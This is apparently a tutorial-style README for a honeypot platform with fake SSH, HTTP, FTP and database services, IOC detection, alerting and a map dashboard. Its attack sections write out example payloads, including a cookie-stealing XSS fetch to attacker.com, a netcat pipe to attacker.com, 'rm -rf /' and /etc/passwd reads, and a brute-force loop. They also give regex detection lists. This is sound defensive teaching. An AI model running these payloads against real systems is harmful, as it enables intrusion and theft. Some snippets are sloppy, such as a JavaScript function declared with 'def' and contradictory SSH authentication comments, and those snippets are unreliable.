# 📚 Honeypot Defense Platform - Complete Documentation

> **A comprehensive guide for understanding every aspect of this cybersecurity project, from beginner concepts to advanced implementation.**

---

## Table of Contents

1. [Project Overview](#1-project-overview)
2. [Beginner Foundations](#2-beginner-foundations)
3. [Technologies & Tools](#3-technologies--tools)
4. [Security & Attack Handling](#4-security--attack-handling)
5. [Logging System](#5-logging-system)
6. [Backend Attack Flow](#6-backend-attack-flow)
7. [Log Analysis](#7-log-analysis)
8. [Full Code Explanation](#8-full-code-explanation)
9. [Docker & Deployment](#9-docker--deployment)
10. [API Reference](#10-api-reference)

---

## 1. Project Overview

### 1.1 What is a Honeypot? (Simple Explanation)

Imagine you want to catch thieves breaking into houses. Instead of waiting for them to attack real homes, you build a **fake house** that looks real, fill it with fake valuables, and install hidden cameras. When thieves break in, you:
- Record everything they do
- Learn their techniques
- Alert the police
- Improve real home security

A **honeypot** is exactly that, but for computers! It's a fake computer system that:
- Looks like a real server with valuable data
- Attracts hackers and malicious actors
- Records all their activities
- Alerts security teams
- Helps improve real security

### 1.2 What This Project Does

This project creates a **complete honeypot platform** with:

| Component | Purpose |
|-----------|---------|
| **Fake Login Pages** | Trick attackers into trying to log in |
| **Fake SSH Server** | Capture brute-force login attempts |
| **Fake FTP Server** | Record file transfer attacks |
| **Fake Database** | Detect SQL injection attempts |
| **Dashboard** | Visualize attacks in real-time |
| **World Map** | See where attacks come from |
| **Telegram Alerts** | Get instant notifications |
| **Log Analysis** | Detect patterns and threats |

### 1.3 Real-World Example

**Scenario:** A company wants to protect their real web server.

**Solution:** They deploy this honeypot on a separate server.

**What happens:**
1. Attacker scans the internet for vulnerable servers
2. Finds the honeypot (thinks it's real)
3. Tries SQL injection: `'; DROP TABLE users; --`
4. Honeypot **captures** the attempt
5. Logs: IP address, time, attack type, payload
6. **Alerts** security team via Telegram
7. Shows attack on world map from attacker's country
8. Security team learns the attack pattern
9. Real server is protected with this knowledge

### 1.4 High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                         INTERNET                                │
│                    (Attackers live here)                        │
└──────────────────────┬──────────────────────────────────────────┘
                       │
                       │ Attacks come from here
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│                    HONEYPOT PLATFORM                            │
├─────────────────────────────────────────────────────────────────┤
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐        │
│  │  HTTP    │  │   SSH    │  │   FTP    │  │    DB    │        │
│  │ Honeypot │  │ Honeypot │  │ Honeypot │  │ Honeypot │        │
│  │  :8080   │  │  :2222   │  │  :2121   │  │  :3306   │        │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘        │
│       │             │             │             │               │
│       └─────────────┴──────┬──────┴─────────────┘               │
│                            │                                    │
│                            ▼                                    │
│  ┌─────────────────────────────────────────────────────────┐   │
│  │              LOG AGGREGATOR                              │   │
│  │     (Collects and organizes all attack data)            │   │
│  └─────────────────────────┬───────────────────────────────┘   │
│                            │                                    │
│         ┌──────────────────┼──────────────────┐                │
│         │                  │                  │                │
│         ▼                  ▼                  ▼                │
│  ┌─────────────┐   ┌─────────────┐   ┌─────────────────┐      │
│  │   IOC       │   │   Packet    │   │   Web Dashboard │      │
│  │  Detector   │   │   Capture   │   │    :5000        │      │
│  │             │   │             │   │                 │      │
│  │ • Patterns  │   │ • PCAP      │   │ • Real-time     │      │
│  │ • Alerts    │   │ • Network   │   │ • World Map     │      │
│  │ • Telegram  │   │ • Evidence  │   │ • Statistics    │      │
│  └─────────────┘   └─────────────┘   └─────────────────┘      │
└─────────────────────────────────────────────────────────────────┘
```

---

## 2. Beginner Foundations

### 2.1 What is Programming?

**Analogy:** Programming is like writing a recipe for a robot.

Just like a recipe tells a chef exactly what to do step-by-step, a **program** tells a computer exactly what to do.

**Example Recipe (Human):**
```
1. Take 2 slices of bread
2. Spread peanut butter on one slice
3. Spread jelly on the other
4. Put them together
5. Cut in half
```

**Example Program (Computer):**
```python
# This is Python code
bread = 2
peanut_butter = "crunchy"
jelly = "grape"

sandwich = bread + peanut_butter + jelly
print("Sandwich ready!")
```

**Key Point:** Computers are extremely literal. They do EXACTLY what you tell them, nothing more, nothing less.

### 2.2 Backend vs Frontend

**Analogy:** A restaurant

| Component | Restaurant Equivalent | Digital Equivalent |
|-----------|----------------------|-------------------|
| **Frontend** | Dining room, menu, decor | Website you see and interact with |
| **Backend** | Kitchen, chefs, inventory | Server that processes requests |
| **Database** | Pantry, ingredient storage | Where data is stored |

**Frontend (Client-Side):**
- What users see and click
- Runs in your browser
- HTML, CSS, JavaScript
- Example: Login form, buttons, maps

**Backend (Server-Side):**
- Processes requests
- Runs on a server (computer)
- Python, Node.js, databases
- Example: Check password, save data, send alerts

**Real Example:**
```
You (Frontend)          Server (Backend)
     |                        |
     |  "Login please"        |
     | ─────────────────────> |
     |                        | Check database
     |                        | Verify password
     |  "Welcome!"            |
     | <───────────────────── |
```

### 2.3 What is an API?

**Analogy:** A restaurant menu

An **API (Application Programming Interface)** is like a menu at a restaurant:
- It lists what you CAN order (available functions)
- It describes what you'll get (return values)
- You don't need to know HOW the chef makes it

**Example API:**
```
RESTAURANT API:
- order_burger() → Returns: Burger
- order_fries()  → Returns: Fries
- pay_bill(amount) → Returns: Receipt

You don't need to know:
- How the burger is cooked
- Where ingredients come from
- How the payment processes
```

**In Our Project:**
```python
# Our Dashboard API
GET /api/sessions      → Returns list of attack sessions
GET /api/stats         → Returns statistics
GET /api/country/US    → Returns attacks from USA
POST /api/alert        → Sends an alert
```

### 2.4 HTTP Request/Response

**Analogy:** Sending a letter

**HTTP Request** = You writing and sending a letter
**HTTP Response** = The reply you receive

**Parts of an HTTP Request:**
```
POST /login HTTP/1.1          ← Method + Path + Version
Host: example.com             ← Where to send
Content-Type: application/json ← What format

{                              ← Body (the actual data)
    "username": "admin",
    "password": "secret123"
}
```

**Parts of an HTTP Response:**
```
HTTP/1.1 200 OK               ← Version + Status Code
Content-Type: application/json

{                              ← Body
    "success": true,
    "message": "Welcome!"
}
```

**Common Status Codes:**
| Code | Meaning | Example |
|------|---------|---------|
| 200 | OK | Request successful |
| 404 | Not Found | Page doesn't exist |
| 500 | Server Error | Something broke |
| 401 | Unauthorized | Wrong password |

### 2.5 What is JSON?

**Analogy:** A standardized form

**JSON (JavaScript Object Notation)** is a way to format data that's easy for computers to read.

**Why JSON?**
- Human-readable
- Machine-parseable
- Language-independent
- Universal standard

**Example JSON:**
```json
{
    "name": "John",
    "age": 30,
    "is_student": false,
    "courses": ["Math", "Science"],
    "address": {
        "street": "123 Main St",
        "city": "Boston"
    }
}
```

**In Our Project:**
```json
{
    "session_id": "abc123",
    "attacker_ip": "192.168.1.100",
    "attack_type": "sql_injection",
    "timestamp": "2024-01-15T10:30:00Z",
    "payload": "'; DROP TABLE users; --"
}
```

### 2.6 What is a Server?

**Analogy:** A 24/7 reception desk

A **server** is a computer that:
- Runs continuously (24/7)
- Waits for requests
- Processes those requests
- Sends back responses

**Physical Server:**
- Powerful computer in a data center
- Has IP address (like a phone number)
- Runs server software

**Software Server:**
- Program that listens for connections
- Example: `web_dashboard.py` listens on port 5000

**In Our Project:**
```
Your Computer                    Server (Honeypot)
     |                                |
     |  "Show me the dashboard"       |
     | ─────────────────────────────> |
     |                                | Processes request
     |  "Here's the HTML page"        |
     | <───────────────────────────── |
```

### 2.7 What is a Database?

**Analogy:** A filing cabinet

A **database** is an organized collection of data.

**Without Database (Bad):**
```
login_attempts.txt:
admin tried to login at 10:00
root tried to login at 10:05
admin tried again at 10:10
```
- Hard to search
- Easy to corrupt
- No structure

**With Database (Good):**
```
Table: login_attempts
┌─────────┬──────────┬─────────────────┬──────────┐
│ user    │ password │ time            │ ip       │
├─────────┼──────────┼─────────────────┼──────────┤
│ admin   │ 123456   │ 2024-01-15 10:00│ 1.2.3.4  │
│ root    │ password │ 2024-01-15 10:05│ 5.6.7.8  │
│ admin   │ admin    │ 2024-01-15 10:10│ 1.2.3.4  │
└─────────┴──────────┴─────────────────┴──────────┘
```
- Easy to search: "Show all attempts from IP 1.2.3.4"
- Structured
- Reliable

**In Our Project:**
We use **JSON files** as a simple database to store session data.

### 2.8 What is Encryption?

**Analogy:** A secret code

**Encryption** scrambles data so only authorized parties can read it.

**Simple Example (Caesar Cipher):**
```
Original: HELLO
Encrypted: KHOOR (shift each letter by 3)
Decrypted: HELLO (shift back by 3)
```

**Real Encryption (HTTPS):**
```
Your Password: "secret123"
Encrypted: "a8f5d2e9b1c4..." (256-bit encryption)
```

**Why Encryption Matters:**
- Protects passwords
- Secures credit cards
- Keeps messages private
- Prevents eavesdropping

**In Our Project:**
- Passwords are checked but not stored in plain text
- HTTPS should be used in production
- Session tokens are cryptographically secure

---

## 3. Technologies & Tools

### 3.1 Python

**What it is:**
A programming language known for being easy to read and write.

**Why we use it:**
- Simple syntax (reads like English)
- Huge library ecosystem
- Great for web servers
- Excellent for data processing

**Example in our project:**
```python
# This is Python - notice how readable it is!
def check_login(username, password):
    if username == "admin" and password == "correct":
        return True
    return False
```

**How it works:**
1. You write Python code (`.py` files)
2. Python interpreter reads the code
3. Converts to machine instructions
4. Computer executes

**Alternatives:**
- Node.js (JavaScript)
- Go
- Ruby
- Java

**Common errors:**
```python
# IndentationError - Python cares about spaces!
def my_function():
print("Hello")  # Wrong! Must indent

# Correct:
def my_function():
    print("Hello")  # Indented with 4 spaces
```

### 3.2 Flask

**What it is:**
A Python library for building web servers and APIs.

**Why we use it:**
- Lightweight and simple
- Perfect for our dashboard
- Easy to learn
- Great documentation

**How it works:**
```python
from flask import Flask

app = Flask(__name__)  # Create web server

@app.route('/hello')   # When someone visits /hello
def hello():
    return 'Hello World!'  # Send this back

# Run the server
app.run(port=5000)
```

**In our project:**
```python
# web_dashboard.py
from flask import Flask, render_template

app = Flask(__name__)

@app.route('/')
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/sessions')
def get_sessions():
    sessions = load_sessions_from_files()
    return jsonify(sessions)
```

**Key Concepts:**
- **Route**: URL path (like `/login`)
- **View Function**: Code that runs for that route
- **Template**: HTML with placeholders
- **Request**: Data sent TO the server
- **Response**: Data sent FROM the server

**Alternatives:**
- Django (more features, more complex)
- FastAPI (modern, fast)
- Express.js (Node.js)

**Common errors:**
```python
# Forgetting to return something
@app.route('/broken')
def broken():
    result = "Hello"  # Not returned!

# Correct:
@app.route('/fixed')
def fixed():
    return "Hello"  # Now it's sent to browser
```

### 3.3 Flask-SocketIO

**What it is:**
Enables real-time communication between server and browser.

**Why we use it:**
- Live updates without refreshing
- Instant attack notifications
- Real-time map updates

**Analogy:**
- Normal HTTP: You call a friend, ask a question, they answer, hang up
- WebSocket: You stay on the call, instant back-and-forth

**How it works:**
```python
from flask_socketio import SocketIO, emit

socketio = SocketIO(app)

# When client connects
@socketio.on('connect')
def handle_connect():
    print('Client connected!')

# Send data to all clients
def broadcast_attack(attack_data):
    socketio.emit('new_attack', attack_data)
```

**In our project:**
```javascript
// Browser side (JavaScript)
socket.on('new_session', function(data) {
    // Instantly show new attack on map
    addMarkerToMap(data.location);
    updateStats(data);
});
```

**Alternatives:**
- WebSockets (raw)
- Server-Sent Events
- Polling (inefficient)

### 3.4 Leaflet.js

**What it is:**
An open-source JavaScript library for interactive maps.

**Why we use it:**
- Free and open source
- Easy to use
- Mobile friendly
- Lots of plugins (like heatmap)

**How it works:**
```javascript
// Create a map
var map = L.map('map').setView([51.505, -0.09], 13);

// Add map tiles (the actual map images)
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

// Add a marker
L.marker([51.5, -0.09]).addTo(map)
    .bindPopup('Attack from here!')
    .openPopup();
</script>
```

**In our project:**
```javascript
// Initialize threat map
threatMap = L.map('worldMap', {
    center: [20, 0],
    zoom: 2
});

// Dark theme tiles
L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(threatMap);

// Add heatmap for attack intensity
heatmapLayer = L.heatLayer(attackPoints, {
    radius: 25,
    blur: 15,
    maxZoom: 10
}).addTo(threatMap);
```

**Alternatives:**
- Mapbox GL JS (more features, paid)
- Google Maps API (paid)
- OpenLayers (more complex)

**Common errors:**
```javascript
// Map container not found
// Make sure HTML has: <div id="map"></div>

// Tiles not loading
// Check internet connection and tile URL
```

### 3.5 Telegram Bot API

**What it is:**
Official API for creating bots on Telegram messenger.

**Why we use it:**
- Instant mobile notifications
- Free to use
- Reliable delivery
- Rich formatting (HTML, Markdown)

**How it works:**
1. Create bot with @BotFather
2. Get bot token (like a password)
3. Send HTTP requests to Telegram servers
4. Telegram delivers message to users

**Example:**
```python
import requests

BOT_TOKEN = "123456:ABC-DEF1234"
CHAT_ID = "123456789"

url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

payload = {
    'chat_id': CHAT_ID,
    'text': '🚨 Attack detected!',
    'parse_mode': 'HTML'
}

response = requests.post(url, json=payload)
```

**In our project:**
```python
# alert_manager.py
class TelegramBot:
    def send_message(self, message: str) -> bool:
        url = f"{self.base_url}/sendMessage"
        payload = {
            'chat_id': self.chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
```

**Alternatives:**
- Discord webhooks
- Slack API
- Email notifications
- SMS (Twilio)

**Common errors:**
```python
# Wrong chat ID - bot not started by user
# Solution: User must message bot first

# Rate limiting
# Solution: Add delays between messages
```

### 3.6 Docker

**What it is:**
A tool that packages applications with all their dependencies.

**Analogy:**
Imagine shipping a cake:
- Without Docker: Send recipe, hope they have ingredients
- With Docker: Send entire kitchen with cake already made

**Why we use it:**
- Consistent environments
- Easy deployment
- Isolation (services don't interfere)
- Scalability

**Key Concepts:**
- **Image**: Blueprint for a container (like a class)
- **Container**: Running instance (like an object)
- **Dockerfile**: Instructions to build image
- **docker-compose.yml**: Orchestrates multiple containers

**Example Dockerfile:**
```dockerfile
# Use Python base image
FROM python:3.9-slim

# Set working directory
WORKDIR /app

# Copy requirements
COPY requirements.txt .

# Install dependencies
RUN pip install -r requirements.txt

# Copy code
COPY . .

# Run the application
CMD ["python", "app.py"]
```

**In our project:**
```dockerfile
# monitoring/web-dashboard/Dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

EXPOSE 5000

CMD ["python", "web_dashboard.py"]
```

**Common errors:**
```bash
# Port already in use
# Solution: Change port mapping in docker-compose.yml

# Container exits immediately
# Solution: Check logs with: docker logs <container_name>
```

### 3.7 Watchdog

**What it is:**
A Python library that monitors file system events.

**Why we use it:**
- Detect when log files change
- Trigger actions on file modifications
- Real-time log processing

**How it works:**
```python
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class LogHandler(FileSystemEventHandler):
    def on_modified(self, event):
        if event.src_path.endswith('.log'):
            print(f"Log file changed: {event.src_path}")
            process_new_log_entries()

# Start watching
observer = Observer()
observer.schedule(LogHandler(), '/logs', recursive=True)
observer.start()
```

**In our project:**
```python
# ioc_detector.py
class LogFileHandler(FileSystemEventHandler):
    def on_modified(self, event):
        if event.src_path.endswith('.log'):
            self.process_log_file(event.src_path)
    
    def process_log_file(self, filepath):
        with open(filepath, 'r') as f:
            for line in f:
                if self.is_malicious(line):
                    self.send_alert(line)
```

**Alternatives:**
- Manual polling (inefficient)
- inotify (Linux only)
- fswatch (cross-platform)

### 3.8 Paramiko

**What it is:**
A Python library for SSH protocol.

**Why we use it:**
- Create fake SSH server
- Capture login attempts
- Log usernames and passwords

**How it works:**
```python
import paramiko

# Create SSH server
server = paramiko.Transport(('0.0.0.0', 2222))
server.add_server_key(host_key)

# Handle authentication
class SSHHandler(paramiko.ServerInterface):
    def check_auth_password(self, username, password):
        log_attempt(username, password)  # Record the attempt!
        return paramiko.AUTH_FAILED  # Always reject
```

**In our project:**
```python
# services/ssh/ssh_honeypot.py
class HoneypotSSHServer(paramiko.ServerInterface):
    def check_auth_password(self, username, password):
        self.session.log_login_attempt(username, password)
        # Always accept (honeypot behavior)
        return paramiko.AUTH_SUCCESSFUL
```

**Alternatives:**
- Twisted Conch
- AsyncSSH
- Built-in socket (very low level)

### 3.9 Chart.js

**What it is:**
A JavaScript library for creating beautiful charts.

**Why we use it:**
- Easy to use
- Responsive
- Animated
- Many chart types

**How it works:**
```javascript
// Create a bar chart
const ctx = document.getElementById('myChart').getContext('2d');
const chart = new Chart(ctx, {
    type: 'bar',
    data: {
        labels: ['Jan', 'Feb', 'Mar'],
        datasets: [{
            label: 'Attacks',
            data: [12, 19, 8],
            backgroundColor: 'red'
        }]
    }
});
```

**In our project:**
```javascript
// Attack type distribution chart
const attackChart = new Chart(ctx, {
    type: 'doughnut',
    data: {
        labels: ['SQL Injection', 'XSS', 'Brute Force'],
        datasets: [{
            data: [30, 20, 50],
            backgroundColor: ['#F97066', '#7C3AED', '#14B8A6']
        }]
    }
});
```

**Alternatives:**
- D3.js (more powerful, complex)
- Highcharts (paid)
- Google Charts

---

## 4. Security & Attack Handling

### 4.1 SQL Injection

**What it is:**
An attack where malicious SQL code is inserted into queries.

**Analogy:**
Imagine a bank form that asks for your account number. Instead of typing "12345", you type:
```
12345 OR 1=1
```

If the bank's system is poorly written, it might give you access to ALL accounts because "1=1" is always true.

**How attacker performs it:**

1. **Find vulnerable input** - Login form, search box, URL parameter

2. **Test for vulnerability** - Type single quote: `'`
   - If error appears → likely vulnerable

3. **Craft malicious payload:**
   ```sql
   Normal query:
   SELECT * FROM users WHERE username='admin' AND password='secret'
   
   Malicious input:
   username: admin' OR '1'='1' --
   
   Resulting query:
   SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='secret'
   
   The -- comments out the rest, and 1=1 is always true!
   ```

4. **Extract data:**
   ```sql
   '; DROP TABLE users; --
   '; SELECT * FROM passwords; --
   ```

**Example malicious request:**
```http
POST /login HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1' --&password=anything
```

**How OUR SYSTEM handles it:**

1. **Detection (ioc_detector.py):**
```python
IOC_PATTERNS = {
    'sql_injection': [
        r"union.*select",      # Matches: UNION SELECT
        r"';.*--",             # Matches: '; --
        r"or.*1=1",           # Matches: OR 1=1
        r"drop.*table",       # Matches: DROP TABLE
    ]
}

def detect(self, log_entry):
    for pattern in IOC_PATTERNS['sql_injection']:
        if re.search(pattern, log_entry, re.IGNORECASE):
            return {'type': 'sql_injection', 'pattern': pattern}
```

2. **Logging:**
```python
# Log the attempt
{
    "timestamp": "2024-01-15T10:30:00Z",
    "attack_type": "sql_injection",
    "source_ip": "192.168.1.100",
    "payload": "admin' OR '1'='1' --",
    "severity": "critical"
}
```

3. **Alerting:**
```python
send_alert(
    title="SQL Injection Detected",
    message="Payload: admin' OR '1'='1' --",
    severity="critical",
    metadata={"ip": "192.168.1.100"}
)
```

4. **Blocking:**
In a real application, you would:
- Use parameterized queries
- Input validation
- Web Application Firewall (WAF)

### 4.2 XSS (Cross-Site Scripting)

**What it is:**
Injecting malicious scripts into web pages viewed by other users.

**Analogy:**
Imagine a public bulletin board. Instead of posting a normal note, you post:
```html
<script>stealCookies()</script>
```

When others view the board, their cookies are stolen!

**How attacker performs it:**

1. **Find input that gets displayed** - Comments, username, search results

2. **Inject script:**
   ```html
   <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
   ```

3. **Wait for victims** - Anyone viewing the page runs the script

**Types of XSS:**
- **Stored XSS**: Script saved to database (persistent)
- **Reflected XSS**: Script in URL parameter (one-time)
- **DOM XSS**: Manipulates page structure directly

**Example malicious request:**
```http
GET /search?q=<script>alert('XSS')</script> HTTP/1.1
```

**How OUR SYSTEM handles it:**

1. **Detection:**
```python
IOC_PATTERNS = {
    'xss': [
        r"<script>",           # Script tags
        r"javascript:",        # JavaScript protocol
        r"onerror=",           # Event handlers
        r"onload=",            # Event handlers
    ]
}
```

2. **In HTTP Honeypot (http_honeypot.py):**
```python
# Log any script tags in input
if '<script>' in user_input:
    logger.warning(f"XSS attempt detected: {user_input}")
    log_attack('xss', user_input, request.remote_addr)
```

3. **Dashboard Protection:**
```javascript
// Escape HTML to prevent XSS in dashboard
def escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Safe display
element.innerHTML = escapeHtml(attacker_payload);
```

### 4.3 Brute Force Attacks

**What it is:**
Trying many passwords until one works.

**Analogy:**
Trying every key on a keyring until one opens the door.

**How attacker performs it:**

1. **Get username** (often "admin", "root", or from leaked databases)

2. **Use password list** (common passwords like "123456", "password")

3. **Automate attempts:**
   ```python
   import requests
   
   passwords = ['123456', 'password', 'admin', 'qwerty']
   
   for pwd in passwords:
       response = requests.post('http://target.com/login', 
                               data={'username': 'admin', 'password': pwd})
       if 'Welcome' in response.text:
           print(f"Found password: {pwd}")
           break
   ```

**Example malicious traffic:**
```
Attempt 1: admin / 123456
Attempt 2: admin / password
Attempt 3: admin / admin
Attempt 4: admin / qwerty
...
Attempt 1000: admin / dragon123
```

**How OUR SYSTEM handles it:**

1. **Detection:**
```python
# Track login attempts per IP
login_attempts = {}

def check_brute_force(ip, username):
    key = f"{ip}:{username}"
    
    if key not in login_attempts:
        login_attempts[key] = []
    
    login_attempts[key].append(datetime.now())
    
    # Count attempts in last 5 minutes
    recent = [t for t in login_attempts[key] 
              if datetime.now() - t < timedelta(minutes=5)]
    
    if len(recent) > 10:  # More than 10 attempts
        return True  # Brute force detected!
    
    return False
```

2. **SSH Honeypot Logging:**
```python
# services/ssh/ssh_honeypot.py
def log_login_attempt(self, username, password, success=False):
    attempt = {
        'timestamp': datetime.now().isoformat(),
        'username': username,
        'password': password,  # Yes, we capture passwords!
        'source_ip': self.client_ip,
        'success': success
    }
    
    # Save to file
    with open('ssh_attempts.json', 'a') as f:
        json.dump(attempt, f)
        f.write('\n')
```

3. **Alert on pattern:**
```python
if detect_brute_force(ip):
    send_alert(
        title="Brute Force Attack Detected",
        message=f"IP {ip} made 50+ login attempts",
        severity="high"
    )
```

### 4.4 Path Traversal

**What it is:**
Accessing files outside intended directories using `../` sequences.

**Analogy:**
A building where each floor needs a key. You find an elevator that accepts:
```
Floor: ../../../basement/secret-vault
```

The `../` means "go up one level" - do it enough times and you're at the root!

**How attacker performs it:**

1. **Find file download endpoint:**
   ```
   GET /download?file=report.pdf
   ```

2. **Try path traversal:**
   ```
   GET /download?file=../../../etc/passwd
   ```

3. **Access sensitive files:**
   - `/etc/passwd` (Linux user list)
   - `C:\Windows\System32\config\SAM` (Windows passwords)
   - `../../../app/config/database.yml`

**Example malicious request:**
```http
GET /images/../../../etc/passwd HTTP/1.1
Host: vulnerable-site.com
```

**How OUR SYSTEM handles it:**

1. **Detection:**
```python
IOC_PATTERNS = {
    'path_traversal': [
        r"\.\./",              # ../ (Unix)
        r"\.\.\\",            # ..\ (Windows)
        r"\/etc\/passwd",     # /etc/passwd
        r"c:\\windows",       # Windows system
    ]
}
```

2. **HTTP Honeypot:**
```python
@app.route('/download')
def download():
    filename = request.args.get('file')
    
    # Log the attempt (even if blocked)
    if '..' in filename or filename.startswith('/'):
        log_attack('path_traversal', filename, request.remote_addr)
        return "Access denied", 403
    
    # Normal processing...
```

### 4.5 Command Injection

**What it is:**
Executing arbitrary system commands through application input.

**Analogy:**
A drive-thru where you order "Burger and also give me the cash from the register." If the cashier blindly follows instructions, you're in trouble!

**How attacker performs it:**

1. **Find input used in system commands:**
   ```python
   # Vulnerable code
   import os
   domain = request.args.get('domain')
   os.system(f"ping {domain}")  # DANGEROUS!
   ```

2. **Inject commands:**
   ```
   domain: google.com; cat /etc/passwd
   domain: google.com && rm -rf /
   domain: google.com | nc attacker.com 9999
   ```

**Example malicious request:**
```http
GET /ping?domain=google.com;cat+/etc/passwd HTTP/1.1
```

This executes:
```bash
ping google.com; cat /etc/passwd
```

**How OUR SYSTEM handles it:**

1. **Detection:**
```python
IOC_PATTERNS = {
    'command_injection': [
        r";.*cat.*\/etc\/passwd",   # ; cat /etc/passwd
        r"\|.*bash",                # | bash
        r"`.*whoami",               # `whoami`
        r"\$\(.*id\)",              # $(id)
    ]
}
```

2. **Logging:**
```python
# Capture the exact command attempted
log_entry = {
    'attack_type': 'command_injection',
    'injected_command': 'cat /etc/passwd',
    'full_payload': 'google.com; cat /etc/passwd',
    'source_ip': '192.168.1.100'
}
```

---

## 5. Logging System

### 5.1 What Are Logs?

**Analogy:** A security camera recording

Logs are records of events that happen in a system. Just like security cameras record what happens in a building, logs record what happens in software.

**Why logging is critical:**
1. **Debugging** - Find out what went wrong
2. **Security** - Detect attacks
3. **Auditing** - Prove compliance
4. **Analytics** - Understand usage patterns
5. **Forensics** - Investigate incidents

### 5.2 What We Log

**Every log entry includes:**

| Field | Description | Example |
|-------|-------------|---------|
| **timestamp** | When it happened | `2024-01-15T10:30:00Z` |
| **source_ip** | Who did it | `192.168.1.100` |
| **request_method** | HTTP method | `GET`, `POST` |
| **request_path** | What they accessed | `/login` |
| **user_agent** | Their browser/tool | `Mozilla/5.0...` |
| **request_body** | What they sent | `{"username":"admin"}` |
| **headers** | Additional info | `Content-Type: json` |
| **response_code** | Success/failure | `200`, `404`, `500` |
| **attack_type** | If malicious | `sql_injection` |
| **severity** | How serious | `low`, `medium`, `high`, `critical` |

### 5.3 Example Log Entry

```json
{
    "timestamp": "2024-01-15T10:30:45.123Z",
    "source_ip": "203.0.113.42",
    "country": "CN",
    "session_id": "sess_abc123xyz",
    "service": "http",
    "request": {
        "method": "POST",
        "path": "/login",
        "headers": {
            "User-Agent": "Mozilla/5.0 (compatible; EvilBot/1.0)",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Forwarded-For": "203.0.113.42"
        },
        "body": "username=admin' OR '1'='1&password=test"
    },
    "response": {
        "status_code": 200,
        "body_length": 1245
    },
    "attack_detected": {
        "type": "sql_injection",
        "pattern": "or.*1=1",
        "severity": "critical",
        "confidence": 0.95
    },
    "metadata": {
        "processing_time_ms": 23,
        "honeypot_version": "2.0"
    }
}
```

### 5.4 Log Files in Our Project

| File | Purpose | Location |
|------|---------|----------|
| `http_honeypot.log` | HTTP attack logs | `./data/http/` |
| `ssh_honeypot.log` | SSH brute force | `./data/ssh/` |
| `aggregated.log` | All logs combined | `./data/logs/` |
| `ioc_detector.log` | Alert system logs | `./data/logs/` |
| `sessions/*.json` | Session details | `./data/sessions/` |

### 5.5 Log Rotation

**Why:** Logs can fill up disk space!

**How:**
```python
from logging.handlers import RotatingFileHandler

# Rotate when file reaches 10MB, keep 5 backups
handler = RotatingFileHandler(
    'honeypot.log',
    maxBytes=10*1024*1024,  # 10MB
    backupCount=5
)
```

---

## 6. Backend Attack Flow

### Step-by-Step Pipeline

```
┌─────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
│ Attacker│───▶│ Internet │───▶│ Firewall │───▶│ Honeypot │
└─────────┘    └──────────┘    └──────────┘    └────┬─────┘
                                                    │
                    PIPELINE FLOW                     ▼
                                                    │
    ┌──────────────────────────────────────────────────────────┐
    │ 1. REQUEST ENTERS SERVER                                 │
    │    - TCP connection established                          │
    │    - HTTP/SSH/FTP request received                       │
    │    - Source IP extracted                                 │
    └────────────────────┬─────────────────────────────────────┘
                         │
                         ▼
    ┌──────────────────────────────────────────────────────────┐
    │ 2. MIDDLEWARE INTERCEPTS                                 │
    │    - Request logging middleware runs                     │
    │    - IP address checked against blocklist                │
    │    - Rate limiting applied                               │
    │    - GeoIP lookup performed                              │
    └────────────────────┬─────────────────────────────────────┘
                         │
                         ▼
    ┌──────────────────────────────────────────────────────────┐
    │ 3. VALIDATION RUNS                                       │
    │    - Input sanitized                                     │
    │    - Required fields checked                             │
    │    - Format validated (JSON, form data)                  │
    │    - Size limits enforced                                │
    └────────────────────┬─────────────────────────────────────┘
                         │
                         ▼
    ┌──────────────────────────────────────────────────────────┐
    │ 4. SUSPICIOUS BEHAVIOR DETECTED                          │
    │    - IOC patterns matched against input                  │
    │    - SQL injection patterns checked                      │
    │    - XSS patterns checked                                │
    │    - Path traversal detected                             │
    │    - Command injection scanned                           │
    └────────────────────┬─────────────────────────────────────┘
                         │
                         ▼
    ┌──────────────────────────────────────────────────────────┐
    │ 5. LOG CREATED                                           │
    │    - Structured log entry generated                      │
    │    - Timestamp added                                     │
    │    - Attack classification applied                       │
    │    - Session data updated                                │
    │    - Log written to file                                 │
    └────────────────────┬─────────────────────────────────────┘
                         │
                         ▼
    ┌──────────────────────────────────────────────────────────┐
    │ 6. ALERT SENT                                            │
    │    - Severity assessed                                   │
    │    - Telegram notification dispatched                    │
    │    - Slack webhook triggered (if configured)             │
    │    - Generic webhook called (if configured)              │
    │    - Retry logic applied                                 │
    └────────────────────┬─────────────────────────────────────┘
                         │
                         ▼
    ┌──────────────────────────────────────────────────────────┐
    │ 7. REQUEST HANDLED                                       │
    │    - Fake response generated                             │
    │    - Session extended                                    │
    │    - Real-time update sent to dashboard                  │
    │    - Response returned to attacker                       │
    └──────────────────────────────────────────────────────────┘
```

### Detailed Code Flow

**Step 1: Request Enters (http_honeypot.py)**
```python
# Line ~640 in http_honeypot.py
@app.route('/admin/login', methods=['POST'])
def admin_login():
    # Request arrives here
    # Flask automatically parses HTTP request
    
    # Extract data from request
    username = request.form.get('username', '')  # Get username field
    password = request.form.get('password', '')  # Get password field
    source_ip = request.remote_addr               # Get attacker IP
    
    # Log the attempt immediately
    logger.warning(f"Admin login attempt: username={username}, password={password}")
```

**Step 2: IOC Detection (ioc_detector.py)**
```python
# Line ~95 in ioc_detector.py
def detect(self, log_entry):
    """
    This function scans log entries for attack patterns
    """
    # Convert to string if it's a dictionary
    if isinstance(log_entry, str):
